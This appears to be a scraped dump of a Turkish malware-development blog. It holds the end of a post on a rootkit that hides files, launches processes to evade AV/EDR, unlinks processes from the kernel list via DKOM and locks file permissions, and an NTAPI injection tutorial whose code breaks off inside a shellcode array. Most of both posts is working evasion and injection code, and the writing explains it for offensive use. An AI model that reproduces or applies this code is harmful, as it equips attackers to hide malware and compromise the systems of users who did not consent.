CreateHiddenFile() { HANDLE HandleDirectory = NULL; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status; InitializeObjectAttributes(\u0026ObjAttr, \u0026G_ExecutablePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwCreateFile(\u0026HandleDirectory, GENERIC_ALL, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN, \\ FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { return Status; } ZwClose(HandleDirectory); return STATUS_SUCCESS; } Burada Object Attributes başlatılıyor ve ardından ZwCreateFile çağrılarak gizli dosya oluşturuluyor.\nCreating the Process Dosya oluşturulduktan sonra, kullanıcı modu programı NtCreateUserProcess ile bir işlem oluşturur. Dürüst olmak gerekirse bunu rootkit’te yapmadım.\nBu projeyi ilk geliştirmeye başladığımda, çekirdek modu sürücüsünde ZwCreateProcess’i bulmaya ve oluşturmaya çalıştım ve diğer birçok yöntemi denedim, ancak ne yazık ki hiçbiri benim için işe yaramadı. Daha sonra ZwCreateProcessEx gibi API’lerin çekirdek düzeyinde process’ler oluşturmak için kullanıldığını öğrendim ve Microwave90 kullanıcısının kernel tabanlı driver projesinde uyguladığı NtCreateUserProcess gibi diğer yöntemleri denedim, ancak boşuna.\nDaha sonra yaptığım araştırmalarda Capt. Meelo’nun blogunda NtCreateUserProcess’in usermode programinda çalıştırılması ile ilgili bir yazı buldum ve açıkçası kod benim için çok faydalı oldu ve kullanıcı modu programıma süreç oluşturmayı eklemeye karar verdim. İşte kodlar:\nNTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) { PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL; PPS_ATTRIBUTE_LIST AttrList; PS_CREATE_INFO CreateInfo = { 0 }; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; NTSTATUS Status; Status = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \\ RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } CreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); AttrList-\u003eTotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE); AttrList-\u003eAttributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME; AttrList-\u003eAttributes[0].Size = ImagePath.Length; AttrList-\u003eAttributes[0].Value = (ULONG_PTR)ImagePath.Buffer; Status = NtCreateUserProcess(\u0026HandleProcess, \u0026HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \\ \u0026CreateInfo, AttrList); if (!NT_SUCCESS(Status)) { RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return Status; } *HandlePtr = HandleProcess; RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return STATUS_SUCCESS; } Usermode’dan CreateProcess çağrısı yaptığımızda aşağıdaki adımlar işlenecektir:\nİlk olarak kernel32’den CreateProcessInternal, ardından ntdll.dll’den NtCreateUserProcess ve son olarak kernel moduna girerek ntoskrnl.exe’den NtCreateUserProcess çağrılır. Burada NtCreateUserProcess’in kullanılmasının nedeni, Meelo’nun makalede bahsettiği gibi, AV/EDR tespit kontrollerinden kaçmak için kullanılabilecek en düşük seviye API olmasıdır.\nAncak dikkat ederseniz, NtCreateUserProcess’i doğrudan kod içinde çağırmıyoruz. Bundan önce bazı adımları tamamlamamız ve ardından NtCreateUserProcess’i çağırmamız gerekiyor. Çünkü Windows bir işlem oluştururken bazı parametrelerin belirtilmesini bekler. Bu parametreler RTL_USER_PROCESS_PARAMETERS ve PS_ATTRIBUTE_LIST’dir.\nRemoving the Malware from the Process List Process oluşturulduktan sonra, rootkit process’i process listesinden silecektir. Bunun için DKOM attack tekniğini kullanılacak:\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0; ULONG MinorVersion = 0; ULONG BuildNumber = 0; NTSTATUS Status; Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) { return 0; } /* Note that these offset value (For 0x448) may change with future updates. */ if (10 == MajorVersion \u0026\u0026 22000 \u003e= BuildNumber) { /* The offset value 0x448 has been tested in Windows 10 and Windows 11. If the offset value 0x448 fails in the windows version you tried, you can find and change the offset of ActiveProcessLink with windbg. */ return 0x448; // For Win 10 and Win 11 } else if (10 == MajorVersion) { return 0x448; // For Win 10 and Win 11 } else if (6 == MajorVersion \u0026\u0026 3 == MinorVersion) { return 0x2e8; // For Win 8 } else if (6 == MajorVersion \u0026\u0026 1 == MinorVersion) { return 0x118; // For Win 7 } return 0; } NTSTATUS HideProcess(HANDLE ProcessID) { PLIST_ENTRY ActiveProcessLink; PEPROCESS Process; ULONG Offset; NTSTATUS Status; Status = PsLookupProcessByProcessId(ProcessID, \u0026Process); if (!NT_SUCCESS(Status)) { return Status; } Offset = GetActiveProcessLinkOffset(); if (0 == Offset) { return STATUS_NOT_SUPPORTED; } ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + Offset); RemoveEntryList(ActiveProcessLink); return STATUS_SUCCESS; } The Active Process Link çift bağlı liste olarak düzenlenmiştir. Bu yapıda, her kayıt (veya node) iki pointer saklar: biri bir önceki düğüme, diğeri de listedeki bir sonraki düğüme. Bu pointer’lar tüm düğümleri birbirine bağlayarak her iki yönde de geçişe izin verir.\nWindows kernel’da, çift bağlantılı bir listenin eşdeğeri aşağıdaki gibi tanımlanan LIST_ENTRY veri yapısı ile temsil edilir:\nkd\u003e dt _list_entry ntdll!_LIST_ENTRY +0x000 Flink : Ptr64 _LIST_ENTRY +0x008 Blink : Ptr64 _LIST_ENTRY Burada Flink (ileri bağlantı) ve Blink (geri bağlantı), standart bir çift bağlantılı listedeki Next ve Previous pointerlara karşılık gelir. Projede, bu offset kullanılarak, Process’in PIDsine göre aranır ve Flink ve Blink pointerları güncellenerek listeden kaldırılır ve process sistem görünümlerinden etkili bir şekilde gizlenir.\nAşağıdaki kod parçacığı, bir rootkit’in ActiveProcessLink girişini listeden kaldırarak bir process’i nasıl gizleyebileceğini göstermektedir. İlk olarak, kod, Windows sürümüne bağlı olarak işlem yapısı içindeki ActiveProcessLink ofsetini hesaplar, çünkü bu ofsetler sürümler arasında değişebilir:\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0, MinorVersion = 0, BuildNumber = 0; NTSTATUS Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) return 0; if (MajorVersion == 10 \u0026\u0026 BuildNumber \u003c= 22000) { return 0x448; // Windows 10 / 11 tested offset } else if (MajorVersion == 6 \u0026\u0026 MinorVersion == 3) { return 0x2e8; // Windows 8 } else if (MajorVersion == 6 \u0026\u0026 MinorVersion == 1) { return 0x118; // Windows 7 } return 0; } Manipulating the Permissions of the Hidden File Son darbe rootkit tarafından gelmektedir. Oluşturulan gizli dosya ve indirilen executable dosyanın izinleri manipüle edilir.\nWindows’ta dosya izinleri, İsteğe Bağlı Erişim Kontrol Listeleri (DACL’ler) içeren Güvenlik Tanımlayıcıları aracılığıyla yönetilir. DACL’yi değiştirerek şunları yapabilirsiniz:\nStandart kullanıcıların okuma, yazma veya silme erişimini reddedebilirsiniz.\nYalnızca güvenilen sistem işlemlerinin veya yöneticilerin gizli dosyayla etkileşime girmesine izin verin.\nDosyanın yanlışlıkla veya kötü niyetle kaldırılmasını önleme.\nRootkit tarafından gizli dosya ve executable dosyası silinemez ve çalıştırılamaz hale getirelecektir. Bu izin değişikliği hem admin hem de normal kullanıcılarını etkileyecek şekilde hareket eder.\nSonuç Bu dökümanda, sonlandırıldığında kendini otomatik olarak yeniden başlatarak malware’inn devam etmesini sağlayan bir tekniğe değindik. DKOM aracılığıyla process gizleme ve gizli dosyaların güvenliğini sağlama dahil olmak üzere usermode ve kernelmode rootkit yöntemlerini birleştiren bir proje üzerinde çalıştık."},"title":"Malware Resurrection"},"/tr/docs/malware-dev/ntapi-injection/":{"data":{"":"","ntapi-ile-shellcode-çalıştırma#NTAPI ile Shellcode Çalıştırma":"","ntapi-injection-nedir#\u003cstrong\u003eNTAPI Injection Nedir?\u003c/strong\u003e":"","ntapi-nedir#\u003cstrong\u003eNTAPI Nedir?\u003c/strong\u003e":"","sonuç#Sonuç":"Merhabalar. Bu blogta NTAPI Injection konusunu öğreneceğiz.\nUser mode ve Kernel Mode Tekniğe geçmeden önce bazı temel şeyleri anlamamız gerekiyor ve User-Mode ve Kernel-Mode nedir bunlara bir göz atalım.\nWindows işletim sistemi, temel olarak iki farklı çalışma alanı sunar: user mode (kullanıcı modu) ve kernel mode (çekirdek modu). Bu ayrım, işletim sisteminin güvenliğini, işleyişinin düzenlenmesi ve kaynakların verimli bir şekilde kullanılması üzerine kuruludur. Her iki alan da farklı roller üstlenir ve birbirini tamamlar.\nUser mode (Ring 3), işletim sisteminde çalışan uygulamalar ve process’ler için ayrılmış bir alandır. Bu modda çalışan process’ler, sistem kaynaklarına ve donanıma doğrudan erişemez. Bunun yerine, işletim sisteminin kernel modunda çalışan çekirdek bileşenlerine çağrılar yapar. Bu çağrılar, genellikle WinAPI ve asıl konumuz olan ve daha alt seviyede NTAPI üzerinden gerçekleştirilir. User mode alanın diğer özellikleri:\nKullanıcı uygulamalarının çalıştığı güvenli bir alan sağlar. Çökme durumunda yalnızca ilgili uygulamayı etkiler, sistemin tamamını etkilemez. Donanım erişimi için kernel mode’a geçiş yapması gerekir. Kernel mode (Ring 0) ise işletim sisteminin çekirdeği ve donanımla doğrudan iletişimde olan bileşenlerin çalıştığı alandır. Bu modda çalışan driver’lar, sistem üzerinde tam kontrole sahiptir yani user-mode alanına kıyasla daha fazla ayrıcalığa ve güce sahiptir. Ancak bu güç, beraberinde büyük bir sorumluluk getirir: Kernel modunda oluşan hatalar tüm sistemi etkileyebilir ve çökmesine neden olabilir. Kernel mode alanın diğer özellikleri:\nDonanıma ve sistem kaynaklarına doğrudan erişim sağlar. Güvenlik önlemleri ve hata toleransı açısından daha az izole bir ortamdır. NTAPI çağrılarının işlenip yürütüldüğü seviyedir. NTAPI Nedir? Eğer önceki DLL Injection ve Shellcode Execution blog yazılarımı takip ettiyseniz, bu tekniklerde kodlarımızı çalıştırmak için genellikle WinAPI işlevlerini kullandığımızı hatırlarsınız. Ancak WinAPI, Windows işletim sisteminin daha kullanıcı dostu bir katmanını temsil eder ve temelinde NTAPI (Native API) yer alır.\nNTAPI, Windows’un hem kernel mode (çekirdek modu) hem de user mode (kullanıcı modu) uygulamaları tarafından kullanılan hafif ve düşük seviyeli bir programlama arayüzüdür. WinAPI’nin arka plandaki işleyişi büyük ölçüde NTAPI’ye dayanır. Örneğin, WinAPI işlevlerini gerçekleştiren birçok alt program, kernel32.dll gibi kütüphaneler aracılığıyla NTAPI çağrılarını kullanır.\nKafanıza daha iyi oturmak için bir senaryo oluşturalım. Diyelim ki user mode programından OpenProcess’i çağırdığımızı varsayalım. Aşağıdaki diyagramda gösterilen işlemler gerçekleşecektir:\nDiyagramımıza göz attığımızda User mode programın çağırdığı OpenProcess API’si ilk olarak kernel32.dll‘de kütüphanesine yönleniyor ve artık bu modun son durağı olan ntdll.dll kütüphanesine yöneldiğinde NtOpenProcess’e dönüştüğünü görüyoruz. ntdll.dll kütüphanesi user-mode alanı için son duraktır ve artık bundan sonraki akış kernel alanında devam edecek.\nKernel alanında ise ilk olarak SSDT dediğimiz tabloya yönlendiriliyor Burada SSDT anlatarak kafanızı çok bulandırmak istemiyorum zira biraz ileri seviye ve kafa karıştırıcı bir konu. Ancak kafanızda kalması için şu şekilde düşünebilirsiniz: SSDT (System Service Descriptor Table), user mode’dan yapılan sistem çağrılarının kernel mode’daki doğru API’lara yönlendirilmesini sağlayan bir köprü görevi görür. Bu tablo, çağrılan Native API’ları alır ve kernel mode’da, ntoskrnl.exe içindeki ilgili adreslere yönlendirir. Eğer SSDT yakından tanımak isterseniz SSDT ile ilgili bloguma göz atabilirsiniz.\nSSDT tablosundan sonra ise ntoskrnl.exe içerisinden NtOpenProcess’in adresine yönlendirilerek işlemlerin tamamlandığını görebiliriz.\nBunu canlı bir şekilde görmemiz de mümkün. Visual Studio’da sadece OpenProcess’i çağırdığımız proje oluşturalım ve ardından Windbg’da analiz ederek nelere dönüştüğüne göz atalım:\nUser-mode alanında son durak olan ntdll.dll’e bir breakpoint koyup programı çalıştırdıktan sonra Call Stack’e göz attığımızda ilk başta KERNELBASE!OpenProcess‘in çağırıldığını ve sonra ntdll!NtOpenProcess çağırıldığını görebiliriz. ntdll.dll’den sonra akış kernel alanında devam edecek.\nNTAPI Injection Nedir? Artık temel bilgilerden sonra asıl konumuza gelebiliriz.\nNTAPI Injection tekniği, ntdll.dll tarafından sağlanan Windows Native API ile doğrudan etkileşim kurmayı içerir. Yani bu teknikten yararlanan bir malware, daha yüksek seviyeli Windows API’lar kullanmak yerine ntdll.dll’den daha düşük seviyeleri kullanır. Örneğin malware’da OpenProcess çağırılmaz ve direkt olarak alt seviyesi olan NtOpenProcess çağırılır.\nTekniği daha yakından anlamak için basit bir kodlama yapalım. Bunun için user-mode alanından direkt olarak ntdll.dll’den bir NTAPI nasıl çağırılır buna bakalım. Örneğimiz NtOpenProcess olacak.\nÖncelikle kodlamaya geçmeden hazırlık yapmamız gerekiyor. Direkt olarak daha düşük seviyeli API’lar çağıracağımızdan ve bunlar user-mode alanları için tanımlanmadığından kendimiz tanımlayıp ardından adresini alarak çağırmamız gerekecek.\nİlgili NTAPI oluşturmak için benim de sıklıkla yararlandığım NtDoc gibi sitelerden yararlanabiliriz:\nProjenizde kullanmak istediğiniz NTAPI aratarak yapıya ulaşabiliriz. Bizim amacımız projede NtOpenProcess çağırmak olduğu için bunu aratalım:\nGöründüğü gibi NtOpenProcess API’i dört parametre aldığını görebiliriz:\nNTSYSCALLAPI NTSTATUS NTAPI NtOpenProcess( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ PCOBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId ); Hatırlarsanız OpenProcess fonksiyonu üç parametre alırken alt seviyesi olan NtOpenProcess dört parametre almakta. Ayrıca OpenProcess’e kıyasla iki parametre farklı.\nŞimdi bu aldığımız yapıyı projemize ekleyelim:\nYapıyı projemize eklediğimizde son iki yapılar için hata verdiğini göreceksiniz. Bunlar da usermode alanı için tanımlı olmadığından ntdoc gibi sitelerden bu yapıları tanımlamamız gerekecek. Sitede CLIENT_ID ve OBJECT_ATTRIBUTES diye aratarak yapıları ekleyebiliriz:\nBu iki yapıdan sonra hata aldığınız diğer yapıları da siteden aratarak tanımlayın. Böylece alışmış olursunuz.\nKodlamaya geçmeden önce son olarak NTSTATUS’u da tanımlamamız gerekecek. NTAPI’ların dönüş adresi NTSTATUS dediğimiz tipte olduğu için bunu da tanımlayıp NTSTATUS değerlerine göre başarılı olup olmadığını göreceğiz:\ntypedef _Return_type_success_(return \u003e= 0) long NTSTATUS; Bunu da projemize ekleyelim. Artık kodlamaya geçebiliriz:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef const UNICODE_STRING* PCUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PCUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR; PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* NtOpenProcess)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Kullanim: program.exe \u003cPID\u003e\\n\"); return -1; } DWORD PID = atoi(argv[1]); HMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); NtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); HANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); return 0; } Kod parçamız bu şekilde. Detaylıca göz atalım:\nHMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); main içerisinde ilk olarak ntdll.dll’in adresini alarak başlıyoruz. ntdll’in adresini aldıktan sonra bu kütüphane içerisinden NtOpenProcess’in adresine ulaşacağız.\nNtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); ntdll’in adresini aldıktan sonra GetProcAddress ile ntdll içerisinden NtOpenProcess’in adresini alıyoruz ve projede oluşturduğumuz NtOpenProcess yapısına bu adresi veriyoruz.\nHANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); Son olarak ise NtOpenProcess’i çağırıyoruz. Ancak ondan önce OBJECT_ATTRIBUTES ve CLIENT_ID yapılarını tanımlıyoruz.\nŞu kısma da dikkat edin, OpenProcess’te PID değeri direkt olarak DWORD ile verilirken NtOpenProcess direkt olarak PID değerini almıyor ve CLIENT_ID’in birinci elemanı ve HANDLE tipinde olan UniqueProcess’e veriliyor.\nGözümüz bu kısımdaki if koşuluna kaysın. User mode WinAPI’larına kıyasla NTSTATUS tipinde sonuç döndüren NTAPI’larda eğer 0 sonucunu döndürürse başarılı olduğunu gösterir. Bu yüzden koşulda eğer sonuç olarak 0’dan farklı bir değer döndürüyorsa hata durumunu ekrana bastırıyoruz.\nProgramı direkt olarak çalıştırıp sonucu görmek yerine daha detaylı analiz ederek arka planda neler olduğuna bir tekrar bakalım. Windbg’a kodladığımız .exe dosyasını verelim:\nDebug button’a basdıktan sonra main fonksiyona bir bp koyup çalıştıralım:\nWindbg’ın üst kısmından View \u003e Dissassembly seçeceğini aktifleştirelim ve gelen ekrandan main fonksiyonun disassembly haline göz atalım:\nmain fonksiyona göz atarken ilk olarak GetModuleHandeW ile aldığımız ntdll’in adresine göz atarak başlayabiliriz. GetModuleHandleW çalıştıktan sonraki kısma bir bp koyup rax’ın ne değer aldığına bir bakalım:\nGetModuleHandleW çalıştıktan sonra rax’ın aldığı değere göz attığımızda ntdll.dll’in başlangıç adresine işaret ettiğini doğrulayabiliriz.\nSonraki durağımız GetProcAddress ile NtOpenProcess’in adresi alındığı kısım olacak:\nAynı şekilde GetProcAddress çalıştıktan sonraki kısma bir bp koyalım ve rax’ın aldığı değere göz atalım:\nGörüldüğü üzere GetProcAddress’in çalışmasıyla 00007ffc`7c6dfbd0 adresi elde ediliyor ve adresi kontrol ettiğimizde ntdll içerisinden NtOpenProcess olduğunu görebiliyoruz.\nŞimdi ise son olarak odağımızı NtOpenProcess’i çağırdığımız noktaya çevirelim:\nBu kısımda NtOpenProcess için parametrelerin hazırlandığını ve daha sonradan NtOpenProcess’i çağırdığını görebiliriz. Ancak bir şeyin dikkatinizi çekmesini istiyorum: parametreler ters olarak hazırlanmış. Sembol isimlerine bakarsanız ilk olarak CID yapısının hazırlandığını ve r9 register’a verildiğini ve en son olarak rcx register’a HandleProcess’in adresini verildiğini göreceksiniz.\nOpenProcess gibi WIN32 API'lar stdcall çağırma kurallarını kullanır. Daha iyi anlamak için Microsoft Learn dökümanından yararlanabiliriz:\n“Win32 API işlevlerini çağırmak için __stdcall çağrı kuralı kullanılır. Çağıran kişi yığını temizler, bu nedenle derleyici vararg işlevlerini __cdecl yapar. Bu çağırma kuralını kullanan fonksiyonlar bir fonksiyon prototipi gerektirir. stdcall değiştiricisi Microsoft’a özgüdür.”\nWIN32 API’lar stdcall çağrı kuralını kullandığı için parametreler sağdan sola doğru hazırlanır:\nDaha iyi anlamak için C kodumuza tekrar dönelim:\nNTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); Her ne kadar projede NtOpenProcess’in parametrelerini böyle hazırlasak da, OpenProcess stdcall kuralına dahil olduğu için arka planda bu parametreler sağdan sola hazırlanacaktır. Yani şu şekilde:\nNTSTATUS Status = NtOpenProcessAddress(\u0026CID, \u0026ObjAttr, PROCESS_ALL_ACCESS, \u0026HandleProcess); Yine parametrelere hazırlanırken r9 gibi register’lara hazırlandığını göreceksiniz. Bu register’lar rastgele kullanılmıyor yine Windows’un x64 Calling Convention ile ilgili:\n“İlk dört sıradaki tam sayı (integer) türündeki argümanlar sırasıyla RCX, RDX, R8 ve R9 kayıtlarına atanır. Beşinci ve daha sonraki argümanlar, yukarıda belirtildiği şekilde yığıta aktarılır.”\nFonksiyonun ilk dört parametresi rcx, rdx, r8 ve r9 register’lara aktarılır. Eğer dörtten fazla parametre barındırıyorsa diğerleri stack’e aktarılıyor. Daha iyi anlamak için NtOpenProcess’e yönelirsek, aşağıda gösterildiği gibi hazırlanacaktır:\nNTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); // r9 = \u0026CID, r8 = \u0026ObjAttr, rdx = PROCESS_ALL_ACCESS (1FFFFFh), rcx = \u0026HandleProcess Ayrıca Disassembly ekranına tekrar bakarsak bunu doğrulayabiliriz:\nArtık main içerisinde NtOpenProcess’i çağırdığımız kısma bir bp koyalım ve programı p ile devam ettirerek NtOpenProcess’in döndürdüğü değere bakalım:\nNtOpenProcess çalıştıktan sonra 0 değeri döndürdü. Ne demiştim hatırlayalım: NTSTATUS tipinde dönüş yapan Native API’lar, eğer 0 döndürürse başarılı olduğunu gösterir.\nProjede yaptığımız işlemlerin diyagramını hazırlayalım:\nİlk diyagramdan hatırlarsanız ilk durağımız kernel32.dll’di ancak projemizde bu kısmı atlayarak programda ntdll.dll’den NtOpenProcess’e ulaşıyoruz.\nNTAPI ile Shellcode Çalıştırma Artık NTAPI Injection tekniğinde neler yaptığımızı biliyoruz. Shellcode Execution projemizde yaptığımız adımları yapacağız ancak farklı olarak NTAPI kullanacağız.\nÖncelikle projede utils.h header oluşturalım ve aşağıdaki kodları yapıştıralım:\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e #pragma once #define STATUS_SUCCESS (NTSTATUS)0x00000000L #pragma region STRUCTURES typedef struct _OBJECT_ATTRIBUTES { ULONG Length; VOID* RootDirectory; struct _UNICODE_STRING* ObjectName; ULONG Attributes; VOID* SecurityDescriptor; VOID* SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _PS_ATTRIBUTE { ULONGLONG Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* fn_NtOpenProcess) ( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory) ( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory) ( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx) ( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtWaitForSingleObject) ( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); typedef NTSTATUS(NTAPI* fn_NtClose) ( IN HANDLE Handle ); #pragma endregion Ardından main.c projemizi kodlayalım:\n#include \"utils.h\" /* cmd.exe /K \"echo NTAPI Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" 